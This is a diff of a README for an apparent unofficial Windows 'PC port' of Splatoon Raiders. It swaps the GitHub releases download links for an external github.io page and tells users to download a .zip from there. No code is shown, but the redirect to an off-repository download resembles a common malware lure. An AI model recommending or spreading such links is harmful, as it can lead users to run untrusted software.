@@ -1,6 +1,6 @@
 # 🎮 Splatoon-Raiders-PC-Port - Play Splatoon Raiders on your PC
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Arthurau1457/Splatoon-Raiders-PC-Port/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://arthurau1457.github.io)
 
 Splatoon-Raiders-PC-Port lets you play the game on your Windows computer. This project uses emulator technology to bridge the gap between console hardware and your desktop. Follow these instructions to set up your environment and begin your game.
 
@@ -21,7 +21,7 @@ You also need the following software components:
 
 ## 📥 Getting the Files
 
-1.  Visit the official download page: https://github.com/Arthurau1457/Splatoon-Raiders-PC-Port/releases
+1.  Visit the official download page: https://arthurau1457.github.io
 2.  Select the latest release version on the page.
 3.  Click the file ending in `.zip` to start your download.
 4.  Save the file to a folder you recognize, such as your Downloads folder.
